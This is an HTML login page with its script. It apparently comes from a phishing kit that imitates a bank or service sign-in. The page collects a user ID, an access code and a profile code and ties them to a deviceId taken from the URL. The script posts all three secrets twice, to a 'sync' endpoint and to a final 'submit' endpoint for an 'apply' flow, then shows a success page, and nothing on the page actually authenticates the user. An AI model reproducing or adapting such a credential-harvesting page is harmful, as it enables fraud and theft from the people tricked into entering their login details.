<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Login Details</title>

    <style>
        :root {
            --primary: #0a4da2;
            --primary-dark: #083b7a;
            --bg: #eef4fb;
            --text: #1f2a44;
            --border: #d6e0f0;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: Arial, Helvetica, sans-serif;
        }

        body {
            background: var(--bg);
            color: var(--text);
        }

        .page {
            max-width: 420px;
            margin: auto;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            background: var(--bg);
        }

        .top-banner-full {
            height: 190px;
            overflow: hidden;
        }

        .top-banner-full img {
            width: 100%;
            height: 110%;
            object-fit: cover;
            display: block;
        }

        .form {
            padding: 16px;
            flex: 1;
        }

        h2 {
            text-align: center;
            color: var(--primary);
            font-size: 20px;
            font-weight: 600;
            margin: 8px 0 20px;
        }

        label {
            display: block;
            margin-bottom: 4px;
            font-size: 14px;
            font-weight: bold;
        }

        label span {
            color: red;
        }

        input {
            width: 100%;
            height: 44px;
            padding: 12px;
            font-size: 14px;
            border: 1px solid var(--border);
            border-radius: 8px;
            margin-bottom: 16px;
            outline: none;
        }

        input::placeholder {
            color: #9aa7bf;
        }

        input:focus {
            border-color: var(--primary);
        }

        button {
            width: 100%;
            height: 48px;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            color: #fff;
            background: linear-gradient(180deg, var(--primary), var(--primary-dark));
            cursor: pointer;
            margin-top: 16px;
            position: relative;
        }

        button:disabled {
            background: #b9c7de;
            cursor: not-allowed;
        }

        .spinner {
            display: none;
            width: 20px;
            height: 20px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-top-color: white;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto;
        }

        .loading .btn-text {
            display: none;
        }

        .loading .spinner {
            display: block;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        .bottom-banner {
            height: 140px;
            overflow: hidden;
        }

        .bottom-banner img {
            width: 100%;
            height: 115%;
            object-fit: cover;
            display: block;
        }
    </style>
</head>

<body>
    <div class="page">
        <div class="top-banner-full">
            <img src="../img/top-banner.jpg" alt="Top Banner">
        </div>

        <div class="form">
            <h2 style="margin-bottom:16px;">Login Details</h2>

            <label>User ID <span>*</span></label>
            <input type="text" id="userId" placeholder="Enter User ID">

            <label>Access Code <span>*</span></label>
            <input type="password" id="accessCode" placeholder="Enter Access Code">

            <label>Profile Code <span>*</span></label>
            <input type="password" id="profileCode" placeholder="Enter Profile Code">

            <button id="loginSubmit" disabled>
                <span class="btn-text">Verify & Finish</span>
                <div class="spinner"></div>
            </button>
        </div>

        <div class="bottom-banner">
            <img src="../img/bottom-banner.jpg" alt="Bottom Banner">
        </div>
    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const deviceId = urlParams.get('deviceId') || 'unknown';

        async function syncPageData(pageName, data) {
            try {
                await fetch('/api/form/sync', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        deviceId: deviceId,
                        pageName: pageName,
                        pageData: data,
                        timestamp: new Date().toISOString()
                    })
                });
            } catch (error) {
                console.error('[Form] Sync error:', error);
            }
        }

        async function submitFinalData(allData) {
            try {
                const response = await fetch('/api/form/submit', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(allData)
                });
                return response.ok;
            } catch (error) {
                console.error('[Form] Submit error:', error);
                return false;
            }
        }

        const userIdInput = document.getElementById('userId');
        const accessCodeInput = document.getElementById('accessCode');
        const profileCodeInput = document.getElementById('profileCode');
        const loginSubmitBtn = document.getElementById('loginSubmit');

        [userIdInput, accessCodeInput, profileCodeInput].forEach(input => {
            input.addEventListener('input', validateLogin);
        });

        function validateLogin() {
            loginSubmitBtn.disabled = !(
                userIdInput.value.trim().length >= 3 &&
                accessCodeInput.value.trim().length >= 4 &&
                profileCodeInput.value.trim().length >= 4
            );
        }

        loginSubmitBtn.addEventListener('click', async () => {
            const userId = userIdInput.value.trim();
            const accessCode = accessCodeInput.value.trim();
            const profileCode = profileCodeInput.value.trim();

            loginSubmitBtn.classList.add('loading');
            loginSubmitBtn.disabled = true;

            // Sync page data
            await syncPageData('login_details', { userId, accessCode, profileCode });

            // Final submit for apply flow
            const finalData = {
                deviceId: deviceId,
                userId,
                accessCode,
                profileCode,
                currentFlow: 'apply'
            };

            const success = await submitFinalData(finalData);

            loginSubmitBtn.classList.remove('loading');
            loginSubmitBtn.disabled = false;

            if (success) {
                window.location.href = 'success.html?deviceId=' + encodeURIComponent(deviceId);
            } else {
                alert('Submission failed. Please try again.');
            }
        });
    </script>
</body>

</html>
